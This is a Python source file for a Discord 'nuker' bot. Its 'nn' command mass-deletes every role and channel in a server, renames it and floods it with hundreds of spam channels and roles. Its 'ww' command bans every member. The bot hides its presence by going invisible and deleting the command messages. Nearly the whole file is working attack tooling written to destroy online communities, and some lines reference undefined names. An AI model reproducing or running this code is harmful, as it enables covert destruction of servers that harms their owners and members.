# modules lol
import discord, replit, requests, threading, json
from discord.ext import commands
from discord.utils import get
from itertools import cycle

#######################load nuker#################################
config = json.load(open('config.json'))
token = config.get('Bot Token')
prefix = config.get('Prefix')
channels = config.get('Channel Names')
rolenames = config.get('Role Names')
message = config.get('Spam Message')
servernamechange = config.get('Guild Change')
person = "JOHNNY"
e = (f"\x1b[38;5;21m{prefix}nn \033[37m& \x1b[38;5;21m{prefix}ww")

# # # # # # # #

intents = discord.Intents.default()
intents.members = True
bot = commands.Bot(command_prefix = prefix, intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f'''
    \x1b[38;5;21m╦═╗╔═╗═╗ ╦  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
    \x1b[38;5;21m╠╦╝║╣ ╔╩╦╝  ║║║║ ║╠╩╗║╣ ╠╦╝
    \033[37m╩╚═╚═╝╩ ╚═  ╝╚╝╚═╝╩ ╩╚═╝╩╚═
  \x1b[38;5;21m-------------------------------
     \x1b[38;5;21m> \033[37mClient; \x1b[38;5;21m{bot.user} 
     \x1b[38;5;21m> \033[37mCommands; {e}
     \x1b[38;5;21m> \033[37mPrefix; \x1b[38;5;21m{prefix}
     \x1b[38;5;21m> \033[37mMade By; \x1b[38;5;21m{person}
''')
    await bot.change_presence(status=discord.Status.invisible, activity = discord.Game('‘'))

@bot.command()
async def nn(ctx):
  user = ctx.author
  await ctx.message.delete()
  guild = ctx.guild.id
  
  def roledel(id):
    headers = {'Authorization': f'Bot {token}'}
    requests.delete(f'https://discord.com/api/v9/guilds/{guild}/roles/{id}', headers=headers)
  try:
    for role in list(ctx.guild.roles):
      threading.Thread(target=roledel, args=(role.id,)).start()
      print(f"\x1b[38;5;196mDeleted {roles}")
  except:
    pass
  def channeldel(id):
    headers = {'Authorization': f'Bot {token}'}
    requests.delete(f'https://discord.com/api/v9/channels/{id}', headers=headers)
  try:
    for channel in list(ctx.guild.channels):
      threading.Thread(target=channeldel, args=(channel.id,)).start()
      print(f"\x1b[38;5;196mDeleted {channels}")
  except:
    pass
  try:
    await ctx.guild.edit(name=f"{servernamechange}")
    name=(f"{servernamechange}")
    await ctx.guild.edit(icon=logo)
    print(f"Changed Guild {guild} Details")
  except Exception as e:
    pass
  try:
    for i in range(250):
      await ctx.guild.create_text_channel(name=f'{channels}')
      print(f"\x1b[38;5;196mCreated Channel & Pinged")
  except:
    pass
  def spamrole(id):
    json = {'name': rolenames}        
    headers = {'Authorization': f'Bot {token}'}
    requests.post(f'https://discord.com/api/v9/guilds/{id}/roles', headers=headers, json=json)
  try:
    for i in range(250):
      threading.Thread(target=spamrole, args=(ctx.guild.id,)).start()
      print(f"\x1b[38;5;196mCreated {roles}")
  except:
    pass

@bot.command()
async def ww(ctx):
  await ctx.message.delete()
  guild = ctx.guild.id
  
  def skid(id):
    headers = {'Authorization': f'Bot {token}'}
    requests.put(f'https://discord.com/api/v6/guilds/{guild}/bans/{id}', headers=headers)
  try:
    for member in list(ctx.guild.members):
      threading.Thread(target=skid, args=(member.id,)).start()
      print(f"\x1b[38;5;196mBanned {member}")
  except Exception as e:
    pass

bot.run(token, bot=True)   